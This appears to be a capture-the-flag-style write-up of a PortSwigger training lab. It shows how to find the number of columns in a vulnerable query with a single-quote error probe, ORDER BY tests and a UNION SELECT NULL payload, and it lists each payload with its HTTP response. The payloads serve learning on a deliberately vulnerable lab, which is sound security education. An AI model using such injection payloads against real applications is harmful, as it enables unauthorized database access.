---
layout: post
title: "SQL injection UNION attack, determining the number of columns returned by the query [Write-up]"
date: 2026-06-30
platform: portswigger
vulntype: sqli
difficulty: Medium
category: write-up
tags: [web]
---

## Overview

**Lab:** SQL injection UNION attack, determining the number of columns returned by the query

**Platform:** PortSwigger

**Difficulty:** Medium  

---

# Description 

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

# Solution

First, let's trigger an error using `'`

```python
Gifts'
```

We're getting a 500 error, so our next step will be to determine the number of columns.

```python
Gifts' ORDER BY 1 --

URL:
Gifts'+ORDER+BY+1+--   200
Gifts'+ORDER+BY+2+--   200
Gifts'+ORDER+BY+3+--   200
Gifts'+ORDER+BY+4+--   500
```

We see that the table has 3 columns, and based on the problem statement, we use the following payload:

```python
Gifts' UNION SELECT NULL,NULL,NULL --

URL:
Gifts'+UNION+SELECT+NULL,NULL,NULL+--
```

We ran the test. This payload is not intended for data retrieval. Its purpose is to verify the query structure.
